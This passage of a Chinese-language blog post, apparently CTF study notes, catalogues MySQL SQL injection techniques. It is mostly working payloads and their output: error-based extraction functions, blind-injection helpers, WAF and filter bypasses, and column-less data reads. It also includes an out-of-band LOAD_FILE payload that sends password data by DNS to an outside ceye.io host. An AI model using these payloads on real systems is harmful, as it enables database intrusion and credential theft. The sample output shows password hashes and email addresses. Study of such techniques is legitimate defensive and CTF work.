title="盲注中可能用到的一些点"></a>盲注中可能用到的一些点</h3><ul><li><p>group_concat()将一列数据整合</p></li><li><p>获取当前数据库 <code>select database()</code></p></li><li><p>获取所有的数据库</p><p><code>select group_concat(distinct table_schema) from information_schema.tables</code></p></li><li><p>获取数据库中的表<br><code>select group_concat(table_name) from information_schema.tables where table_schema = &#39;news&#39;</code></p></li><li><p>获取表中的对应列<br><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code> </p></li><li><p>最要紧的就是 = ‘i’或是0x表示，经常在payload里面写成 = {}，应该是 = ‘{}’</p></li><li><p>mysql的单字符比较中不区分大小写，应该使用binary()或者ascii()来区分大小写，测试ascii不管用，但是binary()可以。另外hex()函数用起来也很方便</p><p>另外select * from user where username=’admin’ and binary password=’xxx’这里就已经对password字段进行了二进制处理</p></li><li><p>有一些很有意思的地方(从Ben师傅的一次padding oracle attack结合sql注入的时候在想：在对回车也就是%0a, \n 字符进行getcipher的时候，是写成%0a，还是\n呢？%0a的话，对应加密出三个字符，而\n这对应一个回车字符)：<br>在传递不可显示字符的时候，就比如回车符吧，我们有两种传递方式———将回车符用url编码，也就是写做%0a的形式，在到服务端接收的时候就会自动进行urldecode所以又是回车符了，这时候可能我们会想：在写php代码的时候，将回车符号写作\n  0x0a  \x0a啊这些也都可以在sql中正常运行，那么在作为参数传递时这样写行不行呢，其实是不行的，因为你传过去再输出就可以看到，这些符号的意义并没有被转化为回车符，而只是单纯的几个字符而已。<br>有一种情况特殊些，我们将字符串可以用0xxxxx来代替，但是这并不是在php里面能对0x进行解析为对应的字符，而是因为mysql支持这种字符串的书写格式。</p></li></ul><h2 id="基于报错的注入-盲注部分前面提到了就不说了"><a href="#基于报错的注入-盲注部分前面提到了就不说了" class="headerlink" title="基于报错的注入(盲注部分前面提到了就不说了)"></a>基于报错的注入(盲注部分前面提到了就不说了)</h2><p><strong>首先来了解下如何从报错信息中直接拿到我们要的数据而不用盲注，之后在对报错注入的分类的介绍中我们会附加上如何不用盲注拿数据的payload</strong></p><p>让我们从exp(~0)这个报错函数开始考虑，报错时显示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(0))'</div></pre></td></tr></table></figure><p>看，回显中有显示~0的字样，然后我们可以想到如果是多层嵌套结构的话是分层次执行，如果我们用<code>select user()</code>来代替0，那么执行的顺序就是先进行<code>select user()</code>语句然后再将返回值带入exp函数中执行，最后报错的时候也就会将我们已经执行完毕的那条语句的执行结果输出出来，这时我们就看到了结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((<span class="keyword">select</span> <span class="string">'root@localhost'</span> <span class="keyword">from</span> dual)))<span class="string">'</span></div></pre></td></tr></table></figure><p>OK，了解了原理，我们接下来就要介绍报错盲注的分类了</p><h3 id="5-7版本以上mysql函数"><a href="#5-7版本以上mysql函数" class="headerlink" title="5.7版本以上mysql函数"></a>5.7版本以上mysql函数</h3><p>注意，我们下面介绍的这些函数在5.7版本中才有，而且经过测试能够回显敏感信息</p><p>而很多低版本的mysql都只能报错而在错误信息中不显示关键信息了，所以在高版本mysql中就推荐用这些函数</p><p>下面介绍的这些函数有个共性就是报错都是基于他们传入的参数格式错误而造成的，报错信息中就会展示出错误信息</p><p><code>ST_LatFromGeoHash()</code>函数，参数只能接受纯数字，我们用group_concat()引入逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_LatFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function ST_LATFROMGEOHASH</div></pre></td></tr></table></figure><p><code>ST_LongFromGeoHash()</code>函数是一样的效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_LongFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">ERROR 1411 (HY000): Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function ST_LONGFROMGEOHASH</div></pre></td></tr></table></figure><p>然后是<code>GTID_SUBSET()</code>函数，这个函数需要传两个参数，但是构造的时候注意到使用<code>select GTID_SUBSET((select group_concat(password) from user),&#39;&#39;);</code>并没有报错，然后就瞎猜了下，使用<code>concat</code>字符串链接将其处理一下，然后就成功报错了，迷。。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> GTID_SUBSET(<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="string">''</span>),<span class="string">''</span>);</div><div class="line">output:</div><div class="line">ERROR 1772 (HY000): Malformed GTID <span class="keyword">set</span> specification <span class="string">'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d'</span>.</div></pre></td></tr></table></figure><p><code>GTID_SUBTRACT()</code>函数与上一个是同样的触发方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">GTID_SUBTRACT</span>(<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="string">''</span>),<span class="string">''</span>);</div><div class="line">output:</div><div class="line">ERROR 1772 (HY000): Malformed GTID <span class="keyword">set</span> specification <span class="string">'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d'</span>.</div></pre></td></tr></table></figure><p><code>ST_PointFromGeoHash()</code>函数，需要两个参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> ST_PointFromGeoHash((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line">output:</div><div class="line">ERROR 1411 (HY000): Incorrect geohash value: 'dd9d15d993d6f42f896ab4ba09a6a695,56057a4f4e475d73e48824acf8b54098,6b9412ec641f16892544154952fc8b1d' for function st_pointfromgeohash</div></pre></td></tr></table></figure><h3 id="低版本报错方式"><a href="#低版本报错方式" class="headerlink" title="低版本报错方式"></a>低版本报错方式</h3><p>在低版本中，这些报错方式大都还是能将敏感信息回显出来的，高版本mysql里就不行了，我这里只有5.7版本的mysql，很多报错方式不会再回显敏感信息了，所以这里就只提供报错语句及原理介绍吧</p><p><strong>基于运算溢出的报错</strong></p><p>int型的加法运算溢出报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> ~<span class="number">0</span>+<span class="number">1</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> ~(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>)+<span class="number">1</span>;</div></pre></td></tr></table></figure><p>exp()指数运算溢出，实际上在参数为710及以上时候就会溢出了</p><p>有个比较有意思的点，我在5.7版本的mysql测试中看到，回显信息包括了所有的字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">exp</span>(<span class="number">710</span>);</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div></pre></td></tr></table></figure><p><strong>其他函数</strong></p><p>比较有意思的是，我在高版本mysql测试中，虽然不回显敏感信息了，但会爆出来表中所有的字段名。。。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> multipoint((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>));</div><div class="line">output:</div><div class="line">ERROR 1367 (22007): Illegal non geometric '(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="string">`blog`</span>.<span class="string">`user`</span>.<span class="string">`password`</span> separator <span class="string">','</span>) <span class="keyword">from</span> <span class="string">`blog`</span>.<span class="string">`user`</span>)<span class="string">' value found during parsing</span></div></pre></td></tr></table></figure><p>函数比较多，用法也都比较简单，这里就不一一举例了</p><ul><li>geometrycollection()</li><li>multipoint()</li><li>polygon()</li><li>multipolygon()</li><li>linestring() </li><li>multilinestring() </li></ul><p><strong>在高版本测试中也可以爆出敏感信息的函数</strong></p><p><code>updatexml()</code>函数是mysql中用来修改xml信息的函数</p><p><code>extractvalue()</code>函数是mysql中用来查询xml信息的函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">有时候可能爆不全，不全的时候用limit offset按行取吧</div><div class="line">有时候还容易出问题，尝试使用第二行的写法，将计算结果左右连接上~</div><div class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">1</span>);</div><div class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">user</span>),<span class="number">0x7e</span>));</div><div class="line">output:</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: '~dd9d15d993d6f42f896ab4ba09a6a69</div></pre></td></tr></table></figure><p><strong>基于主键重复的报错</strong></p><p>是目前网上报错注入流传比较多的版本，好处是在高版本中依旧可以爆出错误，同时也没有使用updatexml函数报错限制报错长度为32的弊端</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username='14' or (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin')));</div><div class="line">output:</div><div class="line">ERROR 1062 (23000): Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div><div class="line">注意第一个数字1是要去掉的，为floor(rand(0)*2)的结果</div><div class="line"></div><div class="line">select count(*) from information_schema.tables group by concat(floor(rand(0)*2),(select password from user where username='admin'))</div></pre></td></tr></table></figure><p>原理分析：</p><p>在一条语句<code>select count(*) from user group by username</code>中，数据库的操作是建立一个虚表，比起原表多了一个count()列，group by的那个列变成了主键也就是<code>&lt;group_key&gt;</code>，之后从user表中一条条的取出来数据，在虚表中查找，基于group_key（在这里就是username）的值在虚表中是否已经存在，来决定是在count()列中加1还是新添加一个列。  考虑这个过程，我们使用<code>floor(rand(0)*2)</code>作为<code>&lt;group_key&gt;</code>的话，我们每次从user表里面提出来一条数据准备依据group_key进行插入，第一次计算结果是0，group_key为0，第二次是1，group_key为0，这里都没问题，只是在虚表中多了两个列，一个列名1，一个列名0，第三次插入的时候计算结果为1，这时再准备往虚表中插入虚拟的主键1，就会报主键重复的错误。</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Duplicate entry '16b9412ec641f16892544154952fc8b1d' for key '&lt;group_key&gt;'</div></pre></td></tr></table></figure><h2 id="sql过滤统计"><a href="#sql过滤统计" class="headerlink" title="sql过滤统计"></a>sql过滤统计</h2><p>反正过滤吧，不是想办法绕过，就是再找一个相同功能的写法来替换<br>先放上一些比较经典的：</p><ul><li><a href="https://paper.seebug.org/218/" target="_blank" rel="external">我的WafBypass之道</a></li></ul><p><strong>过滤单引号</strong></p><ul><li>在数据库为gbk编码下可以考虑宽字节注入%df%27来用%df吃掉\</li><li>因为单引号被过滤无法<code>where user=&#39;admin&#39;</code>的时候，用0x写法来代替’’写法</li></ul><p><strong>过滤空格</strong><br>本质上就是用一些无法融入原写法语义的符号放到那里起到空格的分隔作用</p><ul><li>使用<code>() 或者 反引号</code>来做分隔,形如select(*)from(user)的写法，</li><li>sqlmap中space2hash.py的方法，用%23xxx%0a来做空格</li><li>使用<code>/**/</code>来做分隔</li><li>使用%0a来做分隔</li><li>and可以用&amp;&amp;代替 or可以用||代替  这样不仅不需要空格，连and or都不需要</li></ul><p><strong>过滤某些sql语句的关键字</strong></p><ul><li><code>/*!*/</code>来在php中注释过去，但是mysql中会正常执行，形如<code>/*!select*/ flag /*!from*/ flag</code></li><li>中间插入<code>%0a  %0b  %00  /**/</code>这些,形如<code>se%0blect fl/**/ag from flag</code>，但有一点要提醒的是，<code>sel/**/ect</code>这种写法并不是说可以绕过检测而且mysql可以执行，<code>%0b /**/</code>这些字符在sql语句中是存在的，在php那一层就会剔除掉</li><li>考虑大小写绕过SeLect</li><li>最常见的双写绕过的可能千万不要忘了尝试下 <code>selselelctect</code></li></ul><p><strong>过滤某些符号</strong><br>符号的过滤与关键字过滤不同，大部分情况无法进行过滤绕过，多为寻求符号的替代品</p><ul><li>使用greatest来替代大小写符号<code>ascii(mid(user(),1,1)) &lt; 150</code>–&gt;<code>greatest(ascii(mid(user(),1,1)),150)=150</code></li><li>过滤了逗号，使用<code>substring((select xxx) from -1|-2|-3... for 1)</code>来代替<code>((select xxx),1|2|3...,1)</code></li><li>过滤了=，其实=的替代品有很多：like,&lt;,&gt;,^,-其实都可以做运算生成bool结果，另外&lt;&gt;都有等价的函数表示，另外in函数也可以的 select password in (‘’,’’,’’)</li><li>ascii() hex() 可以获得字符的数字形式，需要注意的是hex()返回的是6B这种字符串，最好不要做math运算，因为6B会变成6，所以一般推荐ascii()</li><li>char()  将ascii对应的转化为字符</li></ul><p><strong>末尾截断可用的注释（然而我比较习惯用’’=’）</strong></p><ul><li><code>%23  也就是#</code></li><li><code>--+</code>  注意这里应该用+来表示最后一个空格字符，因为很可能空格没有被传过去的</li><li><code>;%00</code></li><li><code>/*</code>没有测试成功</li><li>反撇号 没有测试成功</li></ul><p><strong>过滤某些函数</strong><br>这不是大事，基本上都能找到相同功能的函数来代替，mysql函数那么多。。。</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/functions.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/8.0/en/functions.html</a></p><p><strong>一些字段关键字被过滤</strong></p><ul><li>和关键子过滤一样，使用<code>/**/ %0b %0a</code>这些来中间断一下</li><li>大小写也是没有问题的，反正mysql对大小写也不敏感</li><li>使用concat(‘adm’+’in’)就可以，但注意mysql中写成’adm’+’in’的结果是0。。。小心不要错了</li><li>limit被禁用，也不能使用group_concat()，这时候就要使用where条件将查询结果限制在一行中，比如可以使用like方法</li></ul><p><strong>waf的缓冲区溢出利用</strong></p><p>因为waf多是基于C语言编写的，所以如果输入的参数大于缓冲区的时候并不会报错而只是检查缓冲区内的部分，溢出的部分就不会进行检查</p><p>这里提供两种思路：</p><ul><li><p>如果参数使用post上传，我们提交两个同名的参数，在php处理策略上，同名参数会以第二个为准，而waf可能会两个都进行处理，这样我们第一个参数提交一个文件来耗尽waf缓存，第二个参数就不会检查了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xxx/xxx.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>    </div><div class="line">    file:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"username"</span> / &gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>          </div><div class="line">    username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"payload"</span> <span class="attr">style</span>=<span class="string">"width:250px;"</span> / &gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span>           </div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"attack"</span> /&gt;</span>      </div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></li><li><p>我们把这个参数写的很长，比如经典的’ or xxx，我们在单引号之前填充很多的数据来耗尽waf的缓冲区，or后面的部分就不会被检测到了 ，比如aaa*1000’ or xxx</p></li></ul><p><strong>其他</strong></p><ul><li><p>过滤了union select from 却没有对单个关键字进行过滤。还是使用变量的方法，将数据存到变量里面，之后再用union select查询，这样就不会与from连起来了</p><p><code>select 1 from user where 2=3|@c:=(select flag from flag) union select @c;</code>这样最后就没有from了</p></li></ul><h2 id="报错注入得到表名列名以及不使用列名下的注入"><a href="#报错注入得到表名列名以及不使用列名下的注入" class="headerlink" title="报错注入得到表名列名以及不使用列名下的注入"></a>报错注入得到表名列名以及不使用列名下的注入</h2><p>如果information_schema，column_name，table_name，所有的表名或多或少的被过滤了，同时存在着报错注入的情况下，我们还是可以想办法通过报错注入拿到表名，列名以及一些数据的</p><h4 id="首先是拿到数据库名"><a href="#首先是拿到数据库名" class="headerlink" title="首先是拿到数据库名"></a>首先是拿到数据库名</h4><p>数据库名很好拿，只要我们在sql查询中使用一个库中并不存在的函数，就会爆出库名</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username='' and c();</div><div class="line">ERROR 1305 (42000): FUNCTION blog.c does not exist</div></pre></td></tr></table></figure><p>实际上数据库名并不是必须要拿的，主要是只能拿当前库的名字，而写sql的时候又没必要加上当前库的名字。。。</p><p>在后面可以看到，拿表名列名什么的时候，也都可以顺便把数据库名爆出来</p><h4 id="然后是拿表名"><a href="#然后是拿表名" class="headerlink" title="然后是拿表名"></a>然后是拿表名</h4><p>注意，拿表名需要至少猜测到一个表中存在的字段名</p><p>在测试基于主键的报错时无意中发现了这么一个报错</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user group by 1 and 1;</div><div class="line">ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'blog.user.username' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by</div></pre></td></tr></table></figure><p>有趣的是这里将数据库名，表名，表中的第一个字段名都爆了出来。这一点会对我们接下来的工作有帮助。</p><p>看到网上通用的做法是利用函数Polygon的报错实现</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username=Polygon(username);</div><div class="line">ERROR 1367 (22007): Illegal non geometric '`blog`.`user`.`username`' value found during parsing</div></pre></td></tr></table></figure><p>原理其实就是将字段名作为报错函数的参数，这样在报错时可能就会将字段的详细信息爆出来，所以之前介绍的那些报错函数大都是可用的</p><ul><li><p>exp()</p></li><li><p>geometrycollection()</p></li><li>multipoint()</li><li>polygon()</li><li>multipolygon()</li><li>linestring() </li><li>multilinestring() </li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from user where username=exp(~username);</div><div class="line">ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(`blog`.`user`.`username`))'</div></pre></td></tr></table></figure><h4 id="其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据"><a href="#其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据" class="headerlink" title="其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据"></a>其实到这一步我们就可以直接拿数据了，有下面几种姿势可以在不使用列名的情况下拿到表里的数据</h4><p>思路一：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> e<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,(<span class="keyword">select</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> )e);</div><div class="line"></div><div class="line">其实目的就是通过这种写法来不用写段名拿到数据：</div><div class="line"><span class="keyword">select</span> e<span class="number">.1</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>)e</div><div class="line"></div><div class="line">格式化展示：</div><div class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</div><div class="line">(<span class="keyword">select</span> e<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c,(<span class="keyword">select</span> <span class="number">4</span>)d <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)e);</div></pre></td></tr></table></figure><p><strong>解释</strong><br>因为不能使用列名，所以通过语句<code>select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d</code>来建立一个形如<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">+<span class="comment">------------------+----------------------------------+---------------------+-------+</span></div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">+<span class="comment">------------------+----------------------------------+---------------------+-------+</span></div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">+<span class="comment">------------------+----------------------------------+---------------------+-------+</span></div></pre></td></tr></table></figure></p><p>这样的表，我们使用别名叫e，如果再链接上我们要操作的表，就是这样</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user;</div><div class="line">+------------------+----------------------------------+---------------------+-------+</div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">+------------------+----------------------------------+---------------------+-------+</div><div class="line">| 1                | 2                                | 3                   | 4     |</div><div class="line">| SometimesSomeone | dd9d15d993d6f42f896ab4ba09a6a695 | 13512279197@163.com | user  |</div><div class="line">| 11               | 56057a4f4e475d73e48824acf8b54098 | 123@12              | user  |</div><div class="line">| admin            | 6b9412ec641f16892544154952fc8b1d | 13512279197@163.com | admin |</div><div class="line">+------------------+----------------------------------+---------------------+-------+</div></pre></td></tr></table></figure><p>所以现在其实列名就已经换成了1，2，3，4来表示了，之后我们就能拿到要的数据了</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select e.2 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user limit 1,1 )e;</div><div class="line">+----------------------------------+</div><div class="line">| 2                                |</div><div class="line">+----------------------------------+</div><div class="line">| dd9d15d993d6f42f896ab4ba09a6a695 |</div><div class="line">+----------------------------------+</div></pre></td></tr></table></figure><p>思路二：</p><p>看了猫哥的wp后又学到了一种姿势，同样可以不用列名就能拿到wp，只是需要盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">where user='admin' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">desc</span>;</div></pre></td></tr></table></figure><p>思路三：</p><p>还能想到LuckGame题目中的做法，就是在没有过滤的点将数据都拿出来存到变量里面，之后直接查变量就好</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">into</span> @a,@b,@c,@d;</div><div class="line">之后读取@a @b @c @d 这四个变量就可以了</div></pre></td></tr></table></figure><h4 id="最后再介绍下拿列名的做法"><a href="#最后再介绍下拿列名的做法" class="headerlink" title="最后再介绍下拿列名的做法"></a>最后再介绍下拿列名的做法</h4><p>出自orange的文章，原理：</p><p>将两个相同的表使用join操作连接到一起<code>select * from user as a join user as b</code>，然后生成的表中就有了相同的列，其实只是列名相同，但他们分别隶属于不同的表的，之后为此表赋予别名，<code>select * from (表) as e</code>，然后就会触发相同列名的错误，因为别名表中是不能有相同的列的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">select * from user where username=&apos;&apos; and</div><div class="line"> (select * from </div><div class="line">(select * from user as a join user as b [开始为空之后逐个为using(爆出的column)])</div><div class="line">  as e);</div><div class="line">output: ERROR 1060 (42S21): Duplicate column name &apos;password&apos;</div></pre></td></tr></table></figure><h2 id="使用Out-of-Band带外攻击来回显数据"><a href="#使用Out-of-Band带外攻击来回显数据" class="headerlink" title="使用Out of Band带外攻击来回显数据"></a>使用Out of Band带外攻击来回显数据</h2><p>在mysql中参数select @@secure_file_priv为空的情况下(事实上并不多见，现在要么置为了固定的tmp文件夹，要么直接为NULL表示禁用文件存取相关操作)，文件操作是支持使用url的，在函数load_file()中可以通过DNS查询来将数据携带出来。</p><p>payload: <code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM user),&#39;.a.wslhlk.ceye.io\\abc&#39;));</code></p><p>在测试中可以看到，因为DNS缓存的原因，相同的域名不会第二次查询，所以建议每次更改a的值</p><p>另外注意域名中只支持英文字母，数字，-，且-不能用作开头和结尾，且长度限制在了63，所以比较适合用于携带hash后的密码这些数据</p><h2 id="只能拿当前表内的数据的情况分析"><a href="#只能拿当前表内的数据的情况分析" class="headerlink" title="只能拿当前表内的数据的情况分析"></a>只能拿当前表内的数据的情况分析</h2><p>有时候因为过滤比较严格，或是所要的数据就在本表内，我们使用的策略往往只能在当前表内查数据</p><p>这种过滤往往是这样的：</p><blockquote><p>限制了select  或者 from，其实就从根本上限制了读取其他表的数据，除非有绕过的方法</p></blockquote><p>虽然不能读取其他的表，我们可能还是有办法读取本表的数据的，下面是几个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">select * from user where username=&apos;&apos;  参数禁止使用select</div><div class="line"></div><div class="line">策略一：   ————————经典的like注入</div><div class="line">select * from user where username=&apos;admin&apos; or binary password like &apos;xx%&apos;</div><div class="line">可以用来拿到username为admin的密码</div><div class="line">select * from user where username=&apos;xxx&apos; or 1 and binary password like &apos;flag&#123;%&apos;</div><div class="line">常对一个字段进行寻找，最后输出为username=&apos;xxx&apos;行,以及password like 